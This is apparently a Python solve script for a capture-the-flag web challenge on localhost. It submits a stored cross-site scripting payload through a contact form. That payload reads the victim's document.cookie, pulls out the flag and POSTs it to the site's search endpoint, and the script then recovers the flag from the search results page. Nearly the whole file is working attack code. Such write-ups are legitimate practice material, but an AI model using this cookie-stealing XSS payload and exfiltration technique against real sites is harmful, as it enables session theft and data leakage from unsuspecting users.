from json import loads
import re
from requests import get,post
from random import randint
url='http://localhost:1337'

# A bit hard solution, could be solved easier if the other users are not using the website

items=loads(open('items.json').read())

def get_results(n):
    try:
        r=get(f'{url}/search').text.split('Other recent')[1].split('Search')
    except:
        return None
    for search in r:
        if search.count('jpg') == n*2:
            matches=re.findall(r'alt="\d+\.jpg"', search)
            matches=[m.split('"')[1] for m in matches]  # Extract the image name
            return matches

def xss():
    pad=randint(1,30) # We pad so we can filter out other queries from the results
    payload=f'''<script>
    let pad={pad};
    '''+'''let flag=document.cookie.split('{')[1].split('}')[0];
    let url="http://127.0.0.1:1337/search"
    let dict='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let body="";
    for(let i=0;i<flag.length;i+=1){
        body+=dict[i]+'='+flag[i]+'&';
    }
    for(let i=0;i<pad;i+=1){
        body+=dict[flag.length+i]+'=a&';
    }

    fetch(url, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: body
    })
    </script>'''
    post(f'{url}/contact',data={'msg':payload})
    res=get_results(32+ pad + 1)
    return res
    
    
flag=[set('abcdefg')]*32
while not all(len(f)==1 for f in flag):
    res=xss()
    if not res:
        continue
    for i in range(32):
        flag[i]=flag[i].intersection(items[res[i]])
    print(flag)
    print()
flag='NH4CK{' + ''.join([list(f)[0] for f in flag])+'}'
print(flag)
    

    


    
